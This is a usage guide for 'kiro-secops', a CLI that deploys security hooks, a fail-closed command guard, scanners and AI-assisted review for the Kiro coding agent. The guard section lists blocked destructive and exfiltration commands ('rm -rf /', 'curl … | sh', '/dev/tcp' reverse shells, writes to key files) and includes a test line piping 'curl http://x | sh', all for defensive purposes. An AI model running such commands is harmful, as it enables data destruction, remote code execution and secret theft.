# Usage guide — running `kiro-secops`

This guide explains **how to run each command day to day**: what it is, how to invoke it, the
options it accepts, the exit codes it returns, and **troubleshooting** for the problems you are
most likely to hit.

It also covers two workflows that are **not** CLI subcommands: the agent-driven **SAST review** and
**DAST triage** (bring your own scanner).

Related guides (to avoid duplication):
- Getting the binary (download per OS + signature/checksum verification, or build from source):
  [`INSTALLER.md`](INSTALLER.md#get-the-binary).
- Installing the external scanners used by `scan` (pinned versions, per environment):
  [`TOOLS.md`](TOOLS.md).
- Using the baseline in CI/CD (headless Kiro CLI + scanners): [`PIPELINES.md`](PIPELINES.md).
- Changing what the commands deploy (hooks, guard, prompts, permissions):
  [`CUSTOMIZATION.md`](CUSTOMIZATION.md).

---

## Before you start

1. **Get the binary on your `PATH`.** This sample does not publish releases — build it and put it on
   your `PATH`.

   **macOS / Linux:**
   ```bash
   make build                                              # produces ./kiro-secops
   mkdir -p ~/.local/bin && cp kiro-secops ~/.local/bin/   # ensure ~/.local/bin is on PATH
   kiro-secops version                                     # confirm it runs
   ```

   **Windows (PowerShell):**
   ```powershell
   go build ./cmd/kiro-secops                              # produces kiro-secops.exe
   $Dest = "$env:LOCALAPPDATA\Programs\kiro-secops"
   New-Item -ItemType Directory -Force -Path $Dest | Out-Null
   Copy-Item .\kiro-secops.exe "$Dest\"
   [Environment]::SetEnvironmentVariable("Path", "$Dest;" + [Environment]::GetEnvironmentVariable("Path","User"), "User")
   # open a NEW terminal, then run:
   kiro-secops version
   ```
   Full download/verify/build options for every OS: [`INSTALLER.md`](INSTALLER.md#get-the-binary).

2. **No `sudo` / admin.** Everything installs into your user's `~/.kiro` (on Windows,
   `%USERPROFILE%\.kiro`). Running as root is refused on Unix; no elevation is needed on Windows.

3. **Environment variables** (all optional):

   | Variable | Used by | Meaning |
   |---|---|---|
   | `KIRO_HOME` | all | Overrides `~/.kiro` (Windows: `%USERPROFILE%\.kiro`). **Must be an absolute path.** |
   | `KIRO_SECOPS_BIN` | `init` | Absolute path to the `kiro-secops` binary the hooks should call. |

   Set a variable for the current session with `export VAR=value` (macOS/Linux) or
   `$env:VAR = "value"` (PowerShell). To persist it, add it to your shell profile, or on Windows use
   `[Environment]::SetEnvironmentVariable("VAR","value","User")` (open a new terminal afterward).

4. **Restart the Kiro session after `install`** so it loads the new steering, skills, agent, and
   `permissions.yaml`.

---

## Command & exit-code quick reference

| Command | What it does | Typical exit codes |
|---|---|---|
| `install` | Deploy the **global** baseline to `~/.kiro/` | `0` ok · `1` failed (rolled back) · `2` bad flags |
| `init` | Scaffold the **workspace** layer into a project's `.kiro/` | `0` ok · `1` failed · `2` bad flags / guard not found |
| `scan` | Run the available scanners over a directory | `0` clean/advisory · `1` findings · `2` operational failure |
| `verify` | Guard self-test (+ install integrity with `--strict`) | `0` passed · `1` failed |
| `guard` | Hook runtime: allow/block a tool call (fail-closed) | `0` allow · `2` block |
| `uninstall` | Restore the pre-install state from the manifest | `0` ok · `1` failed · `2` bad flags |
| `version` | Print the version | `0` |

**Exit-code convention across the CLI:** `0` = success; `1` = a real failure (operation error,
scan findings, `verify` mismatch); `2` = a usage/flag error, a **guard block**, or a **scan
operational failure** (timeout / scanner crashed / required tool missing). Running with no command,
or an unknown command, prints usage and returns `2`.

Run `kiro-secops help` (or `-h`) for the built-in usage summary, and `kiro-secops version` for the
build version.

---

## `install` — deploy the global baseline

### What it is
Deploys the **global layer** (from the embedded payload) into `~/.kiro/`. This is the user's
personal security "floor" and follows you across every workspace. Run it **once per machine/user**.

It writes: `steering/*.md`, `skills/kiro-secops-review/`, `agents/kiro-secops-reviewer.md`,
`settings/permissions.yaml` (structural merge — your own rules are preserved),
`settings/kiroignore` (managed block), and a copy of the binary at `bin/kiro-secops` (so hooks can
find it). Full artifact list: [`INSTALLER.md`](INSTALLER.md#install--global-baseline-follows-the-person).

### How to run
```bash
kiro-secops install                          # default (baseline profile) → ~/.kiro
kiro-secops install --profile strict         # more locked-down profile
kiro-secops install --dry-run                # show what would change, write nothing
KIRO_HOME=/opt/kiro kiro-secops install      # install into a custom base directory
```
After it finishes, it prints the exact line to add `~/.kiro/bin` to your `PATH`. Then restart Kiro.

### Options
| Flag | Effect |
|---|---|
| `--profile baseline\|strict` | Which `permissions.yaml` profile to install (default `baseline`). `strict` removes the broad shell allow-list, denies `web_fetch`, and sets MCP/config writes to `ask`. |
| `--dry-run` | Print the planned actions without writing anything. |
| `--force` | Replace a **managed** artifact that changed, after a safe backup. |

Installation is **transactional**: it writes an ownership manifest (`~/.kiro/.kiro-secops/manifest.json`)
and backs up any pre-existing file; on a mid-way failure it **rolls back**.

> `--profile` accepts the **personal** profiles only. The org-wide **Administration** template
> ([`profiles/admin.yaml`](../internal/assets/payload/global/settings/profiles/admin.yaml),
> deny/ask only) is deliberately **not installable** here — it is distributed by the
> organization, not by the developer. See [`docs/security/ENTERPRISE.md`](security/ENTERPRISE.md).

### Troubleshooting
| Symptom | Likely cause | Fix |
|---|---|---|
| `do not run as root: kiro-secops installs into the user's ~/.kiro (no sudo)` | Ran with `sudo`/as root | Run as your normal user, without `sudo`. |
| `KIRO_HOME must be an absolute path: "..."` | `KIRO_HOME` set to a relative path | Use an absolute path (e.g. `/opt/kiro`), or unset it to default to `~/.kiro`. |
| `kiro-secops: command not found` right after install | `~/.kiro/bin` not on `PATH` | **macOS/Linux:** add the line the installer printed to `~/.zshrc`/`~/.bashrc`, then open a new shell. **Windows:** add `%USERPROFILE%\.kiro\bin` to your user `Path` via PowerShell `SetEnvironmentVariable(..., "User")` (see [`INSTALLER.md`](INSTALLER.md#windows--download-verify-and-install-powershell)), then open a new terminal. |
| Kiro doesn't apply the new steering/agent/permissions | Session started before install | **Restart the Kiro session** — config is loaded at session start. |
| `... managed artifact ... modified` / re-install refuses | You edited a managed file | Re-run with `--force` (backs up your version first) or restore it. |
| "Will this overwrite my own `permissions.yaml` rules?" | — | No. The merge is **structural**: only `kiro-secops`-managed items are replaced; your rules are preserved. |
| Not sure what it would change | — | Run `kiro-secops install --dry-run` first. |

---

## `init` — scaffold the workspace layer

### What it is
Scaffolds the **workspace layer** into a project's `.kiro/` (and a few scanner configs at the repo
root) so the team shares the same hooks and CI. **Commit the result.** It is independent of
`install`, idempotent, and transactional.

It writes: `.kiro/hooks/kiro-secops.json` (`PreToolUse` → guard, `Stop` → review prompt,
`PostTaskExec` → `scan --advisory`, `PostFileCreate` → SDD security injection),
`.pre-commit-config.yaml`, `.gitleaks.toml`, `trivy.yaml`, `.checkov.yaml`, and
`.github/workflows/security-scan.yml`.

### How to run
```bash
cd my-project && kiro-secops init            # scaffold in the current directory
kiro-secops init --project /path/to/proj     # scaffold in another directory
kiro-secops init --dry-run                   # show what would be written
# then commit:
git add .kiro .pre-commit-config.yaml .gitleaks.toml trivy.yaml .checkov.yaml .github
```

### Options
| Flag | Effect |
|---|---|
| `--project DIR` | Target project directory (default: current directory). |
| `--dry-run` | Print the planned actions without writing. |
| `--force` | Replace a managed artifact that changed, after a backup. |

### How the guard path is resolved
`init` writes the **absolute path** of the `kiro-secops` binary into the hooks (so they never depend
on `PATH` at runtime). It resolves the binary in this order:
1. `KIRO_SECOPS_BIN` (must be an absolute path);
2. `$KIRO_HOME/bin/kiro-secops` (i.e. what `install` copied);
3. the currently running executable;
4. `kiro-secops` on `PATH`.

If none resolves to a valid executable, `init` **fails and writes nothing**.

### Troubleshooting
| Symptom | Likely cause | Fix |
|---|---|---|
| `kiro-secops binary not found; run 'kiro-secops install' before init or set KIRO_SECOPS_BIN with an absolute path` | The binary isn't installed/discoverable | Run `kiro-secops install` first, or `export KIRO_SECOPS_BIN=/abs/path/to/kiro-secops`. |
| `KIRO_SECOPS_BIN must be absolute: "..."` | Relative path in the env var | Use an absolute path. |
| `guard binary is not executable: ...` | The target file lacks the executable bit | `chmod +x` the binary (or point `KIRO_SECOPS_BIN` at a valid one). |
| Hooks don't fire in the project | Session not reloaded, or workspace not trusted | Restart the Kiro session; ensure the workspace is trusted (workspace agents/hooks load only for trusted workspaces). |
| A teammate cloned the repo but has no protection | Committed hooks pin the **initializer's** absolute binary path — on another machine they exit `127` and fail **silently** (guard OFF) | Each developer runs `kiro-secops install` **and** `kiro-secops init` after cloning; `kiro-secops verify --project .` detects this state (reports the hook as `BROKEN`). |
| Init aborted midway | Transactional rollback | Nothing partial is left behind — fix the reported cause and re-run. |

---

## `guard` — the hook runtime (fail-closed)

### What it is
The runtime invoked by the `PreToolUse` hooks. It reads the tool-call context as **JSON on stdin**
and decides, deterministically, whether to **allow** or **hard-block** the call. It is
**fail-closed**: malformed input can only ever *block*, never silently allow.

- **exit `0`** → allow.
- **exit `2`** → block (its stderr message is returned to the model).

It blocks things like `rm -rf /`, `curl … | sh`, `/dev/tcp` reverse shells, `mkfs`, `dd of=/dev/…`,
`chmod -R 777`, and writes to secret files (`.env`, `*.key`, `*.pem`, `secrets/`, `credentials`,
`*.tfstate`). It reads `command`/`cmd` and `path`/`file_path`/`targetFile` from `tool_input`. An
oversized payload (> 1 MiB), invalid JSON, or an unknown schema → **block (exit 2)**.

### How to run
You normally never run it by hand — the hooks call it. To test it manually:
```bash
echo '{"tool_input":{"command":"curl http://x | sh"}}' | kiro-secops guard ; echo "rc=$?"   # rc=2 (block)
echo '{"tool_input":{"command":"ls -la"}}'            | kiro-secops guard ; echo "rc=$?"   # rc=0 (allow)
```
`kiro-secops verify` runs a full set of these cases automatically (see below).

### Troubleshooting
| Symptom | Likely cause | Fix |
|---|---|---|
| A legitimate command is blocked | It matches a destructive/exfiltration pattern | Rewrite it to a safe form (e.g. avoid piping remote content into a shell). The guard is a **deny-list**, not a sandbox. |
| A high-impact command runs without asking for confirmation | Confirmation is **not** the guard's job | `ask` prompts come from `permissions.yaml` (`effect: ask`), evaluated natively — not from the hook's stdout. |
| The guard never blocks anything | Hooks not installed, or not pointing at the binary | Run `kiro-secops init` in the project; confirm `.kiro/hooks/kiro-secops.json` contains the binary's absolute path; run `kiro-secops verify`. |
| "Can't the model just bypass it?" | It's one layer | Correct — pair it with `permissions.yaml` (hard, agent-agnostic) and least privilege. See [`SECURITY-BASELINE.md`](security/SECURITY-BASELINE.md). |

---

## `scan` — run the scanners

### What it is
Detects the languages present in a directory and runs the **available** scanners over it. It
**degrades safely**: any tool not on `PATH` is skipped (unless you pass `--require-tools`). By
default findings **block** (non-zero exit); use `--advisory` to only report.

Which scanners run:

| Scope | Tools |
|---|---|
| Always | `semgrep` (`--config p/ci`), `trivy fs` (vuln/secret/misconfig, HIGH+CRITICAL), `gitleaks detect` |
| Python (`*.py`) | `bandit -r . -ll`, `pip-audit` |
| Node/TS (`package.json`, `*.ts/tsx/js/jsx`) | `njsscan`, `npm audit --audit-level=high` |
| Shell (`*.sh`) | `shellcheck --severity=warning` |

Directories `.git`, `node_modules`, and `.terraform` are skipped. Install the scanners per
environment following [`TOOLS.md`](TOOLS.md).

### How to run
```bash
kiro-secops scan .                                  # blocking: findings → exit 1
kiro-secops scan --advisory .                       # report only → exit 0 (used by the PostTaskExec hook)
kiro-secops scan --require-tools .                   # fail if an applicable scanner is missing
kiro-secops scan --timeout 3m .                      # cap each scanner at 3 minutes
kiro-secops scan --format sarif --output scan.sarif  # machine-readable report for code scanning
kiro-secops scan --format json --output scan.json .  # structured report
```

### Options
| Flag | Effect |
|---|---|
| `[DIR]` | Directory to scan (default: `.`). |
| `--advisory` | Report findings but return `0` (non-blocking). |
| `--require-tools` | Treat a missing applicable scanner as an operational failure (`exit 2`). |
| `--timeout D` | Max duration per scanner (Go duration, e.g. `90s`, `3m`; default `10m`). |
| `--format text\|json\|sarif` | Report format (default `text`). |
| `--output FILE` | Write the report to a file instead of stdout. |

> **Secret safety:** raw scanner output is printed **only** on interactive `text` stdout. `json`,
> `sarif`, and any `--output` file **omit** raw tool output, so a scan report never persists a
> leaked secret.

### Exit codes
- `0` — clean, or findings under `--advisory`.
- `1` — findings (blocking mode).
- `2` — operational failure: a scanner **timed out**, a scanner **crashed**, or `--require-tools`
  was set and an applicable scanner was **missing**.

### Troubleshooting
| Symptom | Likely cause | Fix |
|---|---|---|
| A scanner is reported as `skipped` | It isn't on `PATH` | Install it (see [`TOOLS.md`](TOOLS.md)). Use `--require-tools` to make missing tools fail the run. |
| `exit 2` with a `timeout` status | A scanner exceeded `--timeout` | Raise `--timeout` (e.g. `--timeout 20m`) or scan a smaller subtree. |
| `exit 2` with an `error` status | A scanner crashed / bad config | Run that tool directly to see its error; check its config (`trivy.yaml`, `.checkov.yaml`, …). |
| Scan is very slow | Large tree or heavy scanners | Scan a specific path, exclude vendored dirs, or raise the timeout. |
| Fails the build but I want a warning only | Blocking is the default | Add `--advisory` (this is exactly what the `PostTaskExec` hook uses). |
| CI code-scanning wants a file | Need SARIF/JSON | `--format sarif --output scan.sarif`, then upload it (see [`PIPELINES.md`](PIPELINES.md)). |
| `error: scan target is not a directory` | Passed a file path | Pass a **directory** (or `.`). |

---

## `verify` — self-test and integrity check

### What it is
Runs the guard's deterministic **self-test** (a fixed set of block/allow cases) and reports the
installation state. With `--strict`, it also validates the global install against the **manifest**
(presence + SHA-256 of each artifact) and prints the active profile. With `--project DIR`, it also
verifies the **workspace layer** of a project:

- **Hook health** — every command action in `.kiro/hooks/*.json` that pins an absolute executable
  (what `init` materializes) must resolve on **this** machine. This catches the post-clone
  fail-open: a hook pinned to another machine's path exits `127`, which Kiro treats as a silent,
  *non-blocking* failure — the guard would be OFF without anyone noticing.
- **Workspace manifest** — presence of each managed artifact. `MISSING` always fails; `MODIFIED`
  fails **only with `--strict`** (customizing committed artifacts is a legitimate team workflow).

### How to run
```bash
kiro-secops verify                        # guard self-test + a quick presence check of the global artifacts
kiro-secops verify --strict               # also verify global integrity against the manifest (hash + presence)
kiro-secops verify --project .            # also verify this project's hooks + workspace manifest
kiro-secops verify --strict --project .   # everything (CI-friendly drift check)
```

### Options
| Flag | Effect |
|---|---|
| `--strict` | Validate integrity against the manifest(s); `MODIFIED` becomes a failure. |
| `--project DIR` | Also verify that project's workspace layer (hook health + manifest). |

### Exit codes
- `0` — passed.
- `1` — failed: a guard self-test case regressed; (with `--strict`) an artifact is missing,
  modified, or the manifest doesn't exist; (with `--project`) a pinned hook executable does not
  resolve, a managed workspace artifact is missing, or the project was never initialized.

### Troubleshooting
| Symptom | Likely cause | Fix |
|---|---|---|
| `--strict` reports an artifact `MISSING`/`MODIFIED` | Install incomplete or a file was edited | Re-run `kiro-secops install` (use `--force` to replace a modified managed file). |
| `manifest has no registered artifacts` / manifest error | Not installed, or wrong `KIRO_HOME` | Run `install` first; make sure `KIRO_HOME` points at the same base you installed into. |
| `--project` reports a hook as `BROKEN` | Hooks were committed from another machine — the pinned path doesn't exist here | Run `kiro-secops install`, then `kiro-secops init` in the project (rewrites the pin for this machine; keep that rewrite local). |
| `workspace not initialized` | `--project` points at a directory without hooks or manifest | Run `kiro-secops init` there, or fix the `--project` path. |
| Self-test shows a `FAILED` case | The binary is broken/tampered | Rebuild/reinstall from a trusted source. |
| Which profile is active? | — | `verify --strict` prints `active profile: baseline|strict`. |

---

## `uninstall` — restore the previous state

### What it is
Reverts what `install`/`init` created, using the **ownership manifest** as the source of truth — it
never deletes by guessing names. Files that existed before are **restored byte-for-byte** (with
their original mode); files that `kiro-secops` created are removed.

### How to run
```bash
kiro-secops uninstall               # GLOBAL layer in ~/.kiro (honors KIRO_HOME)
kiro-secops uninstall --project .   # WORKSPACE layer created by init (commit the removal)
kiro-secops uninstall --dry-run     # show what would be restored/removed
```

### Options
| Flag | Effect |
|---|---|
| `--project DIR` | Remove the **workspace** layer of that project (default: the global layer). |
| `--dry-run` | Print the planned restore/remove without writing. |
| `--force` | Remove a managed artifact even if it was modified after install. |

### Troubleshooting
| Symptom | Likely cause | Fix |
|---|---|---|
| Refuses to remove a file (says it was modified) | Protection against losing your edits | Re-run with `--force` if you're sure. |
| `uninstall` fails saying there's no manifest | Nothing was installed, or wrong `KIRO_HOME`/`--project` | Point at the correct base/project; without a manifest it fails instead of deleting blindly. |
| The workspace still shows changes after uninstall | The removal is a file change | Commit the removal in the workspace case. |

---

## SAST review by the `kiro-secops-reviewer` agent (advisory)

### What it is
Beyond the deterministic `scan` gate, the baseline ships an **AI-assisted** review: the
`kiro-secops-reviewer` agent driven by the `kiro-secops-review` skill. The agent is **read-only +
scanners** (`tools: [read, shell]`; no write, no network). With `shell` allowed it **runs the SAST
and SCA tools itself** — `semgrep`, `bandit`, `ruff`, `njsscan`, `eslint`, `shellcheck`,
`trivy config`, `checkov`, `pip-audit`, `npm audit`, `gitleaks` — and triages the output against
**OWASP Top 10 2025 / CWE / ASVS L1–L2**, printing a structured report and a release verdict
(*do not deploy while there are Critical/High*).

It is **advisory and non-deterministic** — it complements, but does not replace, the deterministic
`kiro-secops scan` gate. Both the agent and the skill are deployed by `kiro-secops install` (into
`~/.kiro/agents/` and `~/.kiro/skills/`); the step-by-step workflow lives in
`~/.kiro/skills/kiro-secops-review/SKILL.md` (Steps 1–6: scope → checklist → secrets → SAST/lint →
SCA → report/SARIF).

### How to run
- **Interactive (local):** in a Kiro session, adopt the `kiro-secops-reviewer` agent and ask it to
  review the current diff or a set of files. Allow the `shell` tool if you want it to run the
  scanners (otherwise it reviews by reading only).
- **Automatic (workspace):** the `Stop` review-gate hook installed by `kiro-secops init` triggers a
  review at the end of a turn.
- **Headless / CI:** pipe the diff into the agent:
  ```bash
  git diff "origin/${BASE:-main}...HEAD" | kiro-cli chat --no-interactive \
    --agent kiro-secops-reviewer --trust-tools=fs_read --wrap never \
    "Review the diff for OWASP/CWE, secrets, and deps. Last line: 'VERDICT: PASS' or 'VERDICT: BLOCK'."
  ```
  Full CI recipes: [`PIPELINES.md`](PIPELINES.md).

> **Local vs CI:** locally the agent can run the scanners (`shell`). In CI the examples pass
> `--trust-tools=fs_read` (least privilege), so the agent **reasons over the diff/files only** and
> the scanners run in the separate deterministic `kiro-secops scan` job. Keep the hard gate on `scan`.

### Troubleshooting
| Symptom | Likely cause | Fix |
|---|---|---|
| The `kiro-secops-reviewer` agent isn't listed | Not installed, or session not reloaded | Run `kiro-secops install`, then **restart the Kiro session**. |
| The agent only comments, never runs scanners | `shell` not permitted (e.g. `--trust-tools=fs_read` in CI) | Locally, allow the `shell` tool. In CI this is intentional — rely on `kiro-secops scan` for the blocking gate. |
| A scanner is skipped during review | Tool not on `PATH` | Install it ([`TOOLS.md`](TOOLS.md)); the agent skips missing tools and notes it. |
| Different results on each run | The AI layer is non-deterministic | Expected — treat it as advisory; the deterministic gate is `kiro-secops scan`. |
| It consumes credits | Headless review uses a paid Kiro plan | Run it on demand / only on sensitive diffs (see the README "Cost"). |
| The agent tries to write or reach the network | Should not happen | The agent is read-only by design; `permissions.yaml` (`fs_write: deny`, `web_fetch`) enforces it. Confirm with `kiro-secops verify`. |

---

## DAST triage — bring your own scanner (BYO)

### What it is
kiro-secops **does not run DAST**. You run a DAST scanner (**OWASP ZAP** or **Nuclei**) against a
**running, authorized** target and produce a **JSON report**; the forkable headless image in
[`examples/kiro-headless-ci/`](../examples/kiro-headless-ci/) (`dast-triage` mode) then performs the
**AI triage** of that report: deduplicate, re-prioritize by real risk, map to CWE / OWASP Top 10
2025, flag likely false positives, suggest fixes, and print `VERDICT: PASS|BLOCK`. The image
**bundles no scanner** — that is the "bring your own" part.

### How to run
```bash
# 1) build the review image (build context = repo root)
docker build -f examples/kiro-headless-ci/Dockerfile.review -t kiro-secops-review:local .

# 2) generate a DAST report with YOUR scanner, against a target you are AUTHORIZED to test
nuclei -target "$TARGET_URL" -severity medium,high,critical -json-export dast.json
#   (or OWASP ZAP: zap-baseline.py -t "$TARGET_URL" -J dast.json)

# 3) AI triage of the report (report via stdin, or DAST_REPORT=<file>)
docker run --rm -i -e KIRO_API_KEY -e KIRO_LOG_NO_COLOR=1 \
  kiro-secops-review:local dast-triage < dast.json
```
`KIRO_API_KEY` (a paid Kiro plan) is required. The last line is the gate marker
(`VERDICT: PASS|BLOCK`); exit `0` = PASS, `BLOCK_EXIT` (default `1`) = BLOCK. ZAP-vs-Nuclei guidance
and CI wiring: [`examples/kiro-headless-ci/README.md`](../examples/kiro-headless-ci/README.md) and
[`PIPELINES.md`](PIPELINES.md).

### Troubleshooting
| Symptom | Likely cause | Fix |
|---|---|---|
| `dast-triage mode: provide the report via DAST_REPORT=<file> or through stdin` | No report was passed | Pipe it (`... dast-triage < report.json`, note the `-i`) or set `-e DAST_REPORT=/work/report.json` with `-v "$PWD:/work"`. |
| `KIRO_API_KEY not set` / `authentication failed` | Missing/invalid key or plan | Export the `ksk_...` key as a CI secret; ensure a paid plan with API keys enabled. |
| "report format not recognizable" → `VERDICT: PASS` | Not a JSON DAST report the prompt understands | Export JSON (ZAP `-J`, Nuclei `-json-export`); pass the JSON file, not HTML. |
| No ZAP image in your registry (e.g. ECR) | ZAP has no ECR Public image | Mirror the ZAP image to your ECR, or prefer **Nuclei** (single signed binary, no external image). |
| Worried about scanning the wrong target | DAST sends active requests | Run the scanner **only** against systems you own or are explicitly authorized to test. |
| Want it non-blocking in CI | The image exits non-zero on BLOCK | Set `BLOCK_EXIT=0`, or run the job with `continue-on-error`/`allow_failure` (AI is advisory). |

---

## See also

- [`INSTALLER.md`](INSTALLER.md) — download/verify/build the binary; command & flag reference; merge/manifest internals.
- [`TOOLS.md`](TOOLS.md) — install the external scanners (`scan`) with pinned versions.
- [`PIPELINES.md`](PIPELINES.md) — run scanners + headless AI review in CI/CD.
- [`CUSTOMIZATION.md`](CUSTOMIZATION.md) — change hooks, guard patterns, prompts, agent, steering, permissions.
- [`security/SECURITY-BASELINE.md`](security/SECURITY-BASELINE.md) — the layered security model behind these commands.
- [`dev/ARCHITECTURE.md`](dev/ARCHITECTURE.md) — how `install`/`init`/`guard` work internally.
